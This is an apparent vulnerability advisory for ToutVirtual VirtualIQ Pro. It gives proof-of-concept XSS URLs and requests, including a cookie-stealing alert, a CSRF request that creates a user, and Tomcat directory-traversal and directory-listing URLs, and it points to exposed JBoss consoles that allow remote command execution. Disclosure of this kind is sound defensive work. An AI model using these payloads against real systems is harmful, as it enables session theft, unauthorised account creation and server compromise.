*** SUMMARY ***

ToutVirtual's VirtualIQ Pro is specifically designed for IT administrators
responsible for managing virtual platforms. VirtualIQ Pro provides
Visibility, Analytics and policy-based Optimization - all from one single
console. VirtualIQ Pro is hypervisor-agnostic supporting both Type I and Type
II hypervisors. VirtualIQ Pro can be used to visualize, analyze and
optimize your choice of virtualization platform - Citrix, Microsoft,
Novell, Oracle and/or VMware.

Multiple vulnerabilities has been found which a allow an attacker to conduct
various XSS and CSRF attack, and other attacks due to the use
of an old an not hardened version of the web server.

*** VULNERABILITY DETAILS ***

(a) Cross-site scripting (XSS)

Due to an improper sanitization of user's input, multiple XSS attacks
(reflective and stored) are possible.
Reflective PoCs:

http://server:9080/tvserver/server/user/setPermissions.jsp?userId=1"><sc
ript>alert(1)</script>&resultResourceIds=111-222-1933email (at) address (dot) t [email concealed]
st

http://server:9080/tvserver/server/user/addDepartment.jsp?addNewDept=0&a
mp;deptName=%22;alert(1);//&deptId=1&deptDesc=asd

http://server:9080/tvserver/server/inventory/inventoryTabs.jsp?ID=1;aler
t(1);//

http://server:9080/tvserver/reports/virtualIQAdminReports.do?command=get
Filter&reportName=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

Stored XSS attacks can be triggered in the "Middle Name" parameter in the
"Edit Profile" page with an HTTP request like the following:

POST /tvserver/user/user.do?command=save&userId=1 HTTP/1.1
Host: server:9080
Cookies: JSESSIONID=[...]

userName=IQMANAGER&firstName=IQ&middleName=asd';
alert(document.cookie);//&lastName=MANAGER&email=user%40domain.it&passwo
rd=********&retypePassword=********&redirect=null&passwordModifed=false&
isReportUser=false&roleId=1&supervisorId=1&departmentId=1&locationId=1

(b) Cross-site request forgery (CSRF)

An attacker can perform different types of CSRF attacks against a logged user.
He can, for example, shutdown, start or restart an arbitrary
virtual machine, schedule new activities and so on.

The following HTTP request, if forged by the attacker and executed by the
victim while logged on VirtualIQ, creates an arbitrary user:

POST /tvserver/user/user.do?command=save&userId= HTTP/1.1
Host: server:9080
Cookie: JSESSIONID=[...]

userName=asd1&firstName=asd2&middleName=asd3&lastName=asd4&email=asd5%40
asd.com&password=asd6&retypePassword=asd6=null&passwordModifed=
false&isReportUser=false&roleId=1&supervisorId=1&departmentId=1&location
Id=1

(c) Web server vulnerabilities

VirtualIQ runs on top of an old version of Apache Tomcat: 5.5.9, for which
multiple public vulnerabilities have been released. As a
PoC, a directory traversal attack (CVE-2008-2938)
can be performed as:

http://server:9080/tvserver/server/%C0%AE%C0%AE/WEB-INF/web.xml

Listing of an arbitrary directory (CVE-2006-3835) can also be obtained with
the following PoC:

http://192.168.229.85:9080/tvserver/server/;index.jsp

(d) Information Leakage

Tomcat status page should be disabled or restricted, being accessible at:

http://status:9080/status

Username and password to access a VM through SSH are also available in clear
text in the configuration page.
Since an XSS vulnerability can also be triggered in the same page, an attacker
would also be able to easily capture the full credentials to access
the VM with a specially crafted XSS payload.

(e) Remote code execution

JBoss JMX Management Console is exposed and can be used by remote attackers to
execute arbitrary commands on the system:

http://server:9080/jmx-console/

JBoss Web Console is exposed as well and can be used by remote attackers to
execute any command on the system:

http://server:9080/web-console/

*** EXPLOIT ***

Attackers may exploit these issues through a common browser as explained
above.

*** FIX INFORMATION ***

Upgrade to the latest version, at the moment 3.5 build 10.14.2009

*** WORKAROUNDS ***
